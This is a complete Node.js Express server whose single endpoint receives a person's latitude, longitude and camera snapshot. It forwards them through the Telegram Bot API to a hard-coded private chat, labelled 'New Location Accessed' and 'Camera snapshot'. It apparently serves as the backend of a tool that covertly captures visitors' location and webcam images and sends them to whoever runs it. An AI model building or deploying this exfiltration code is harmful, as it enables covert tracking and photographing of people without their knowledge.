const express = require('express');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');

const app = express();
const port = process.env.PORT || 3000;

app.use(bodyParser.json());

// Telegram Bot details
const botToken = 'YOUR_TELEGRAM_BOT_TOKEN';  // Replace with your actual token
const chatId = '860517021';  // Your Telegram chat ID

app.post('/save-location', async (req, res) => {
    const { latitude, longitude, snapshot } = req.body;

    try {
        // Send location to Telegram
        const locationMessage = `📍 **New Location Accessed:**\n- Latitude: ${latitude}\n- Longitude: ${longitude}`;
        
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: locationMessage,
                parse_mode: 'Markdown'
            })
        });

        // If a snapshot is available, send it as a photo
        if (snapshot && snapshot.startsWith('data:image')) {
            await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    photo: snapshot,
                    caption: '📷 Camera snapshot'
                })
            });
        }

        res.status(200).send('Data successfully sent to Telegram');
    } catch (error) {
        console.error('Error sending data to Telegram:', error);
        res.status(500).send('Failed to send data to Telegram');
    }
});

app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});
